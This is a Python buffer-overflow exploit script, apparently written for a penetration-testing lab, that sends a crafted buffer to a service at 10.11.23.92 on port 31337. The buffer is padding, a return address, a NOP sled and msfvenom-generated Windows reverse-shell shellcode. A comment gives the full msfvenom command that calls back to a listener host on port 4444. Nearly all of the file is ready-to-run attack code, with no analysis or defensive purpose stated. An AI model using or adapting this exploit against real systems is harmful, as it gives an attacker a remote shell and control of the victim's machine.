#!/usr/bin/python
import sys
import socket

# bad chars found - \x00\x0a
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
overflow = (
	"\xda\xc9\xd9\x74\x24\xf4\x5d\xbe\x9f\xa3\x73\xc7\x33\xc9\xb1"
	"\x31\x83\xc5\x04\x31\x75\x14\x03\x75\x8b\x41\x86\x3b\x5b\x07"
	"\x69\xc4\x9b\x68\xe3\x21\xaa\xa8\x97\x22\x9c\x18\xd3\x67\x10"
	"\xd2\xb1\x93\xa3\x96\x1d\x93\x04\x1c\x78\x9a\x95\x0d\xb8\xbd"
	"\x15\x4c\xed\x1d\x24\x9f\xe0\x5c\x61\xc2\x09\x0c\x3a\x88\xbc"
	"\xa1\x4f\xc4\x7c\x49\x03\xc8\x04\xae\xd3\xeb\x25\x61\x68\xb2"
	"\xe5\x83\xbd\xce\xaf\x9b\xa2\xeb\x66\x17\x10\x87\x78\xf1\x69"
	"\x68\xd6\x3c\x46\x9b\x26\x78\x60\x44\x5d\x70\x93\xf9\x66\x47"
	"\xee\x25\xe2\x5c\x48\xad\x54\xb9\x69\x62\x02\x4a\x65\xcf\x40"
	"\x14\x69\xce\x85\x2e\x95\x5b\x28\xe1\x1c\x1f\x0f\x25\x45\xfb"
	"\x2e\x7c\x23\xaa\x4f\x9e\x8c\x13\xea\xd4\x20\x47\x87\xb6\x2e"
	"\x96\x15\xcd\x1c\x98\x25\xce\x30\xf1\x14\x45\xdf\x86\xa8\x8c"
	"\xa4\x69\x4b\x05\xd0\x01\xd2\xcc\x59\x4c\xe5\x3a\x9d\x69\x66"
	"\xcf\x5d\x8e\x76\xba\x58\xca\x30\x56\x10\x43\xd5\x58\x87\x64"
	"\xfc\x3a\x46\xf7\x9c\x92\xed\x7f\x06\xeb"
	)

# 0x080414c3 = \xc3\x14\x04\x08
# 0x080416bf = \xbf\x16\x04\x08
shellcode = "A" * 146 + "\xc3\x14\x04\x08" + "\x90" * 25 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',31337))
	s.send(shellcode + '\r\n')
	s.recv(1024)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 